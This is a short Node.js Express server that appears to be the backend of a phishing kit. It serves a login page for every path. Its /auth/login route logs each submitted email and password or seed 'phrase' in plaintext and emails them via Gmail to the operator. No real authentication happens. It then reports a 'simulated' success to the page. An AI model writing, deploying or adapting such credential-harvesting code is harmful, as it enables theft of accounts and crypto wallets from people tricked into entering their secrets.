const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Serve static files from current directory

// Create transporter for Gmail
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    },
});

console.log('Gmail transporter created for:', process.env.EMAIL_USER);


// Routes
app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;

    console.log('Received login attempt:', { email, password });

    if (!email || !password) {
        return res.status(400).json({ message: 'Email and password are required' });
    }

    try {
        // Send email
        const info = await transporter.sendMail({
            from: `"WebTrack Login" <${process.env.EMAIL_USER}>`,
            to: process.env.EMAIL_USER, // Send to self
            subject: 'New Login Attempt',
            text: `New login attempt detected.\n\nInput: ${email}\nPhrase/Password: ${password}`,
            html: `
        <h3>New Login Attempt</h3>
        <p><strong>Input:</strong> ${email}</p>
        <p><strong>Phrase/Password:</strong> ${password}</p>
      `,
        });

        console.log('Message sent: %s', info.messageId);
        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

        // Respond to frontend
        res.json({ message: 'Login data received and email sent (simulated)' });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ message: 'Failed to send email' });
    }
});

// Catch-all to serve index.html for any other GET request
app.get(/(.*)/, (req, res) => {
    if (!req.path.startsWith('/auth/')) {
        res.sendFile(__dirname + '/index.html');
    } else {
        res.status(404).send('Not found');
    }
});

if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`Server running on http://localhost:${PORT}`);
    });
}

module.exports = app;
